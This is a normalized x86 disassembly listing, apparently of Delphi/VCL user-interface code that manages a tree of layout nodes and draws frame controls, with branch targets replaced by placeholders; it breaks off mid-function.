lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_452654
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_452654
mov ecx ebx
pop edx
call sub_416f4c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4497e0
mov eax [ ebp - 0x4 ]
call sub_452a88
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_452a88
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_452a88
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_452a88
push ebx
mov ebx eax
mov eax ebx
call sub_452590
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_452518
test al al
je r-xdata
mov eax ebx
call sub_4525c4
pop ebx
retn
sub_452ac4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452ab0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_452560
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_452ab4
mov edx esi
call sub_452ac4
sub_452b00
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452a88
mov edi eax
mov eax ebx
call sub_4525c4
cmp edi eax
jl r-xdata
mov eax esi
call sub_452770
mov eax [ esi + 0x1c ]
push eax
push sub_454610
mov edx esi
call sub_452e3c
mov eax ebx
call sub_452a88
mov edi eax
mov eax esi
call sub_45260c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_452b00
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_452b6c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_452590
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_452b94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403124
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4034a0
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45253c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42464c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42979c
mov edx eax
mov eax ebx
call sub_4247c8
mov eax [ ebp - 0x4 ]
call sub_452d64
xor eax eax
push ebp
push sub_452ca0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44d44c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_452770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452ca7
mov eax [ ebp - 0x4 ]
call sub_452d68
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44d410
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_452ca7
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_454b38
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_452cfc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_453d68
mov eax [ esi + 0x10 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_452d7c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_452d7c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_452d7c
pop ecx
sub_452dd4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_452d7c
pop ecx
sub_452e00
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_452e00
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_452e00
pop ecx
sub_452e54
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_452dd4
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4526c0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4526c0
push eax
mov edx 0x1
mov eax ebx
call sub_452654
push eax
mov edx 0x2
mov eax ebx
call sub_452654
pop edx
pop ecx
call sub_416f4c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b5c
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_452ed8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_452910
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416f4c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4497e0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45253c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_452dd4
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_452560
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_453e00
mov edx esi
mov eax ebx
call sub_452dd4
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_449dc4
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45253c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_449db0
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4526c0
mov edx eax
mov eax edi
call sub_452ab0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4526c0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4526c0
mov edx eax
mov eax edi
call sub_452ab0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4526c0
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4530e8
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_453290
jmp r-xdata
sub_4530e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45253c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_452a88
mov edx eax
mov eax ebx
call sub_452ab0
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_452ab0
mov eax [ esi + 0x64 ]
call sub_452a88
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_454158
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_452e3c
mov eax [ esi + 0x64 ]
call sub_452a88
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_454158
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_452e3c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4544dc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_452e3c
mov eax [ esi + 0x64 ]
call sub_452a88
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_454610
xor edx edx
mov eax esi
call sub_452e3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_452ab0
adc edx 0x0
mov eax ebx
call sub_452770
mov eax ebx
call sub_452b00
push esi
push sub_454610
xor edx edx
mov eax esi
call sub_452e3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_453290
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_452770
mov eax [ ebx + 0x14 ]
call sub_452b00
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_453308
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_452a88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_452a88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_452a88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_452654
mov esi eax
mov edx 0x2
mov eax ebx
call sub_452654
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_452a88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_452b60
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_452b88
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452b60
call sub_453308
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452b88
call sub_453308
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4526c0
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4526c0
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_453534
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44d44c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44d410
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_416efc
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4535c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_453534
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_452b88
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_452dd4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_452b88
call sub_453308
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_453650
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f50
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_40459c
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_453698
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453890
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_453d68
mov eax [ ebp - 0x8 ]
call sub_452d64
xor edx edx
push ebp
push sub_453873
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45387a
mov eax [ ebp - 0x8 ]
call sub_452d68
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45253c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_453650
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403350
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_45285c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_453650
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_449d40
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_44ab20
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403154
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4538a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_416f24
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424fb8
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4538f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
